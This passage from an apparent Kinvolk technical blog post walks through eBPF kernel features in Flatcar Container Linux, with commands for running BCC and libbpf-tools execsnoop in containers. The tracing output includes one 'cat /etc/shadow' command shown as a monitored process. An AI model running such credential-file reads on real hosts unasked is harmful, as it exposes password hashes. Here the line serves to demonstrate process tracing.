Flatcar Container Linux Stable release. BCC supports this feature, so it is\npossible to run BCC tools without installing the kernel headers on the host when\nthe kernel is compiled with CONFIG_IKHEADERS . Let’s try it out! In order to get a Flatcar instance running on your computer with qemu you can\nfollow the next steps. You can also get a running instance on any of the various\ncloud providers that Flatcar supports. $ wget https://stable.release.flatcar-linux.net/amd64-usr/current/flatcar_production_qemu_image.img.bz2\n$ bzip2 -d flatcar_production_qemu_image.img.bz2\n$ wget https://stable.release.flatcar-linux.net/amd64-usr/current/flatcar_production_qemu.sh\n$ chmod +x flatcar_production_qemu.sh\n$ ./flatcar_production_qemu.sh Now, you can login in the VM with $ ssh -o \"UserKnownHostsFile=/dev/null\" -o \"StrictHostKeyChecking=no\" -p 2222 [email protected] Warning: Permanently added '[localhost]:2222' (ECDSA) to the list of known hosts.\nLast login: Mon Apr 19 13:59:55 UTC 2021 from 10.0.2.2 on pts/1\nFlatcar Container Linux by Kinvolk stable (2765.2.2) [email protected] ~ $ Let’s check that the IKHEADERS config is actually set [email protected] ~ $ zgrep CONFIG_IKHEADERS /proc/config.gz\nCONFIG_IKHEADERS=m Before creating the toolbox environment, let’s load the kheaders kernel module.\nWe do it that way to avoid having to mount the folders containing the kernel\nmodules into the toolbox environment we create below. If we mount the kernel\nmodules folder then this step is not needed and the BCC tool will load the\nmodule automatically for us. [email protected] ~ $ sudo modprobe kheaders [email protected] ~ $ lsmod | grep -i kheaders\nkheaders         \t3674112  0 Now that we have the module loaded, we can create the toolbox environment. The /sys/kernel/debug path has to be mounted into the toolbox container to allow\nBCC to register and unregister kprobes. Please note that we aren’t sharing any\nvolume related to the kernel headers. [email protected] ~ $ toolbox --bind=/sys/kernel/debug:/sys/kernel/debug Install the bcc-tools package: [ [email protected] ~]# dnf install bcc-tools xz -y Now, we can start using any of the tools provided by BCC. Let’s try execsnoop, a\ntool that monitors the exec syscall, i.e. creation of new processes. Execute\nsome commands in another terminal on the Flatcar host to see how they are traced\nby the execsnoop tool. [ [email protected] ~]# /usr/share/bcc/tools/execsnoop\nPCOMM        \tPID\tPPID   RET ARGS\nping         \t2259   1233 \t0 /usr/bin/ping 8.8.8.8\ncat          \t2260   1233 \t0 /usr/bin/cat /dev/null\ncat          \t2261   1233 \t0 /usr/bin/cat /etc/shadow\n^C We can then see how the tool is reporting the different processes that are\nexecuted in the host. In this case the BCC tool didn’t load the kernel headers\nfrom /lib/modules/$(uname -r)/{source,build}/ but extracted them from /sys/kernel/kheaders.tar.xz into a temporary directory and used them to\ncompile the eBPF code. CONFIG_DEBUG_INFO_BTF This option generates BPF Type Format\n(BTF) information which\nprovides metadata about kernel internal structures. This option is fundamental\nto use the Compile Once - Run Everywhere\n(CO-RE) mechanism that allows to run eBPF programs compiled in other kernel versions,\ndecreasing the time they require to be created as they are shipped pre-compiled\nand it’s not required to compile them in the target machine. This feature is also present in the Flatcar Container Linux Stable release. We\ncan follow the same steps as above to get an instance running: $ wget https://stable.release.flatcar-linux.net/amd64-usr/current/flatcar_production_qemu_image.img.bz2\n$ bzip2 -d flatcar_production_qemu_image.img.bz2\n$ wget https://stable.release.flatcar-linux.net/amd64-usr/current/flatcar_production_qemu.sh\n$ chmod +x flatcar_production_qemu.sh\n$ ./flatcar_production_qemu.sh\n\n$ ssh -o \"UserKnownHostsFile=/dev/null\" -o \"StrictHostKeyChecking=no\" -p 2222 [email protected] Warning: Permanently added '[localhost]:2222' (ECDSA) to the list of known hosts.\nLast login: Mon Apr 19 14:25:31 UTC 2021 on tty1\nFlatcar Container Linux by Kinvolk stable (2765.2.2) In order to try this feature we can use libbpf-tools , a set\nof BCC-based tools that use libbpf and CO-RE, i.e. they are only compiled once.\nThese tools aren’t packaged for any distro yet, so we’ll need to compile them\nfrom source. In this case I’ll compile the tools using Docker. If you don’t want\nto go through this process, you can just use the quay.io/kinvolk/libbpf-tools image we have prepared. Let’s start by creating the container image with the libbpf-tools inside. $ IMAGE=<repo/username/image:tag>\n$ mkdir libbpf-tools-container && cd libbpf-tools-container\n$ cat <<EOF > Dockerfile\nFROM ubuntu:20.04 as builder\n\nRUN set -ex; \\\n    export DEBIAN_FRONTEND=noninteractive; \\\n    apt-get update && \\\n    apt-get install -y build-essential pkg-config clang llvm libcap-dev libelf-dev git && \\\n    git clone https://github.com/iovisor/bcc/ -b v0.19.0 --recurse-submodules && \\\n    cd bcc/libbpf-tools/ && \\\n    make && mkdir /libbpf-tools && DESTDIR=/libbpf-tools prefix=\"\" make install\n\nFROM ubuntu:20.04\nRUN set -ex; \\\n    export DEBIAN_FRONTEND=noninteractive; \\\n    apt-get update && \\\n    apt-get install -y libelf-dev\nCOPY --from=builder /libbpf-tools/bin /usr/bin\nEOF\n$ docker build . -t $IMAGE\n# Push to registry if building on a different host\n$ docker push $IMAGE Now that we have a container image with our tools, we can start a container. It\nhas to be privileged in order to have the permissions needed to load and attach\neBPF programs. /sys/kernel/debug has to be shared, as above, to give BCC\naccess to kprobes. Let’s create the container, get an interactive terminal\nand execute the execsnoop tool. While the execsnoop tool is running, open a\ndifferent ssh session to the Flatcar host and run some commands there, you’ll\nsee how they are traced. $ docker run -it --privileged -v /sys/kernel/debug:/sys/kernel/debug $IMAGE [email protected] :/# execsnoop\nPCOMM        \tPID\tPPID   RET ARGS\ncat          \t1867   1854 \t0 /usr/bin/cat /dev/null\nping         \t1868   1854 \t0 /usr/bin/ping kinvolk.io\n^C CONFIG_BPF_LSM This option enables the LSM BPF\nprograms that are used\nto instrument the LSM hooks. This option is available in the Flatcar Container Linux Beta release and we\nexpect it to be part of Stable on Q2 2021. However, because of some performance\ndegradation the eBPF LSM hook is disabled by default. In order to enable it you\nshould boot the kernel with the lsm=...,bpf command-line\nparameter . This is a pretty new feature in the Kernel and we’re not aware of many tools\nusing it. For instance, one use case is the systemd’s RestrictFileSystems property.\nYou can get more details about that feature in our Extending systemd Security\nFeatures with\neBPF blog post. What’s next We are actively looking for new eBPF features in the Linux kernel that could be\nrelevant for our users. If there is any feature that we’re missing and you\nconsider it’s important, don’t hesitate to reach out and create a feature request\non our issue tracker .", "date": "2021-04-22"}
]